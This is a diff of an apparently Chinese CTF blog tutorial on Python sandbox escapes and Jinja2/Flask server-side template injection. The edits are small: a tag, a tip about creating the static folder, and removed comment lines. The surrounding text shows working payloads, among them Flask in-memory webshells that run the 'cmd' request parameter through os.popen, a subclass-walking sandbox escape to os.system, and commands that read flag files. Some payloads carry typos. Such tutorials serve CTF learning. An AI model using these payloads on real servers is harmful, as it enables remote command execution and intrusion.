@@ -3,6 +3,7 @@ title: python沙箱与ssti入门
 date: 2025-03-11 19:49:28
 tags: 
   - ctf
+  - python
 categories:
   - 技术
   - ctf
@@ -56,18 +57,19 @@ with open("static/test.txt",'w') as f:
 	f.write(os.popen('dir').read())
 ```
 
+如果没static会写入失败，这时候可以先 `mkdir static ; ls >static/1.txt`
+
 #### 2.写templates/rce.html模板文件
 
 #### 3.写app.py热加载
 
-```
+```python
 __import__('os').system("sed -i \"s/rce.html/`cat /f*`/\" rce.py")
 ```
 
 #### 4.打内存马
 
 ```python
-#HDdss
 app._got_first_request=False;app.add_url_rule('/shell','shel1',lambda:'<pre>{0}</pre>'.format(import_('os').popen(request.args.get('cmd')).read()))
 
 app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen('').read())
@@ -86,7 +88,6 @@ get_flashed_messages,lipsum.......
 ```
 
 ```python
-#cookie
 ur1_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None,[])append(lambda resp:CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import __(\'os\').popen(request.args.get(\'cmd\'))read())\")==None else resp)",{'request':ur1_for.__globals__['request'],'app':ur1_for.__g1obals__['sys'].modules['__main__'].__dict__['app']})
 ```
 
@@ -113,7 +114,6 @@ ur1_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(
 **warnings.catch_warnings**类在在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__(很多模块都包含builtins吧)
 
 ```python
-#zero6six
 [x for x in (1).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']("os").system("cat ../flag templates/rce.html")
 ```
 
